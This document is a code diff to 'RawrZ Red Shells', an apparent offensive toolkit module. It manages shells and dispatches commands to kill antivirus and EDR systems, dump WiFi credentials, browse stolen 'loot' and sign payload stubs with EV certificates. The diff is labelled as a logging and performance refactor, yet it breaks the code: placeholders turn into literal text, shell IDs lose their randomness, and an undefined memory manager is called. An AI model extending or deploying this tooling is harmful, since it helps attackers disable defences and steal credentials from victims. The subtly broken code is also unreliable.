@@ -7,12 +7,25 @@ const net = require('net');
 const tls = require('tls');
 
 class RedShells {
+    // Performance monitoring
+    static performance = {
+        monitor: (fn) => {
+            const start = process.hrtime.bigint();
+            const result = fn();
+            const end = process.hrtime.bigint();
+            const duration = Number(end - start) / 1000000; // Convert to milliseconds
+            if (duration > 100) { // Log slow operations
+                console.warn(`[PERF] Slow operation: ${duration.toFixed(2)}ms`);
+            }
+            return result;
+        }
+    }
     constructor() {
         this.name = 'RawrZ Red Shells';
         this.version = '1.0.30';
         this.initialized = false;
-        this.activeShells = new Map();
-        this.shellHistory = new Map();
+        this.activeShells = this.memoryManager.createManagedCollection('activeShells', 'Map', 100);
+        this.shellHistory = this.memoryManager.createManagedCollection('shellHistory', 'Map', 100);
         this.redKiller = null;
         this.evCertEncryptor = null;
         
@@ -113,7 +126,7 @@ class RedShells {
         }
 
         if (shellConfig.platform !== 'all' && shellConfig.platform !== process.platform) {
-            throw new Error(`Shell type ${shellType} is not supported on ${process.platform}`);
+            throw new Error(`Shell type ${shellType} is not supported on process.platform`);
         }
 
         const shell = {
@@ -158,13 +171,13 @@ class RedShells {
                 await this.initializeEVCertFeatures(shell);
             }
 
-            console.log(`[Red Shells] Created ${shellType} shell: ${shellId}`);
+            console.log(`[Red Shells] Created ${shellType} shell: shellId`);
             return shell;
 
         } catch (error) {
             shell.status = 'error';
             shell.error = error.message;
-            console.error(`[Red Shells] Failed to create shell ${shellId}:`, error);
+            console.error("[Red Shells] Failed to create shell " + shellId + ":", error);
             throw error;
         }
     }
@@ -200,13 +213,13 @@ class RedShells {
             shell.status = 'closed';
             shell.exitCode = code;
             shell.closedAt = new Date();
-            console.log(`[Red Shells] Shell ${shell.id} closed with code ${code}`);
+            console.log(`[Red Shells] Shell ${shell.id} closed with code code`);
         });
 
         shell.process.on('error', (error) => {
             shell.status = 'error';
             shell.error = error.message;
-            console.error(`[Red Shells] Shell ${shell.id} error:`, error);
+            console.error("[Red Shells] Shell " + shell.id + " error:", error);
         });
     }
 
@@ -252,11 +265,11 @@ class RedShells {
     async executeCommand(shellId, command) {
         const shell = this.activeShells.get(shellId);
         if (!shell) {
-            throw new Error(`Shell ${shellId} not found`);
+            throw new Error("Shell " + shellId + " not found");
         }
 
         if (shell.status !== 'active') {
-            throw new Error(`Shell ${shellId} is not active (status: ${shell.status})`);
+            throw new Error("Shell ${shellId} is not active (status: " + shell.status + ")");
         }
 
         // Check for Red Killer commands
@@ -290,7 +303,7 @@ class RedShells {
                     const detected = await this.redKiller.detectAVEDR();
                     return {
                         handled: true,
-                        output: `[Red Killer] Detection complete: ${detected.antivirus.length} AV, ${detected.edr.length} EDR systems found`,
+                        output: "[Red Killer] Detection complete: ${detected.antivirus.length} AV, " + detected.edr.length + " EDR systems found",
                         data: detected
                     };
 
@@ -299,14 +312,14 @@ class RedShells {
                     if (systems.length === 0) {
                         return {
                             handled: true,
-                            output: '[Red Killer] Usage: redkiller-execute <system1> <system2> ...',
+                            output: '[Red Killer] Usage: redkiller-execute <system1>` <system2>` ...',
                             error: 'No systems specified'
                         };
                     }
                     const result = await this.redKiller.executeRedKiller(systems);
                     return {
                         handled: true,
-                        output: `[Red Killer] Termination complete: ${result.totalSuccessful}/${result.totalAttempted} successful`,
+                        output: "[Red Killer] Termination complete: ${result.totalSuccessful}/" + result.totalAttempted + " successful",
                         data: result
                     };
 
@@ -323,7 +336,7 @@ class RedShells {
                     const wifi = await this.redKiller.dumpWiFiCredentials();
                     return {
                         handled: true,
-                        output: `[Red Killer] WiFi dump completed: ${wifi.length} profiles found`,
+                        output: "[Red Killer] WiFi dump completed: " + wifi.length + " profiles found",
                         data: wifi
                     };
 
@@ -331,7 +344,7 @@ class RedShells {
                     const loot = await this.redKiller.browseLootContainer();
                     return {
                         handled: true,
-                        output: `[Red Killer] Loot container: ${loot.length} items`,
+                        output: "[Red Killer] Loot container: " + loot.length + " items",
                         data: loot
                     };
 
@@ -370,7 +383,7 @@ class RedShells {
                     if (parts.length < 3) {
                         return {
                             handled: true,
-                            output: '[EV Cert] Usage: evcert-encrypt <certId> <stubCode>',
+                            output: '[EV Cert] Usage: evcert-encrypt <certId>` <stubCode>`',
                             error: 'Missing parameters'
                         };
                     }
@@ -387,7 +400,7 @@ class RedShells {
                     const certs = await this.evCertEncryptor.getCertificates();
                     return {
                         handled: true,
-                        output: `[EV Cert] Certificates: ${certs.length} found`,
+                        output: "[EV Cert] Certificates: " + certs.length + " found",
                         data: certs
                     };
 
@@ -395,7 +408,7 @@ class RedShells {
                     const stubs = await this.evCertEncryptor.getEncryptedStubs();
                     return {
                         handled: true,
-                        output: `[EV Cert] Encrypted stubs: ${stubs.length} found`,
+                        output: "[EV Cert] Encrypted stubs: " + stubs.length + " found",
                         data: stubs
                     };
 
@@ -518,7 +531,7 @@ class RedShells {
     async terminateShell(shellId) {
         const shell = this.activeShells.get(shellId);
         if (!shell) {
-            throw new Error(`Shell ${shellId} not found`);
+            throw new Error("Shell " + shellId + " not found");
         }
 
         try {
@@ -536,17 +549,17 @@ class RedShells {
             shell.status = 'terminated';
             shell.terminatedAt = new Date();
             
-            console.log(`[Red Shells] Shell ${shellId} terminated`);
+            console.log("[Red Shells] Shell " + shellId + " terminated");
             return true;
         } catch (error) {
-            console.error(`[Red Shells] Failed to terminate shell ${shellId}:`, error);
+            console.error("[Red Shells] Failed to terminate shell " + shellId + ":", error);
             throw error;
         }
     }
 
     // Generate unique shell ID
     generateShellId() {
-        return `shell_${Date.now()}_${crypto.randomBytes(8).toString('hex')}`;
+        return `shell_${Date.now()}_crypto.randomBytes(8).toString('hex')`;
     }
 
     // Get system status
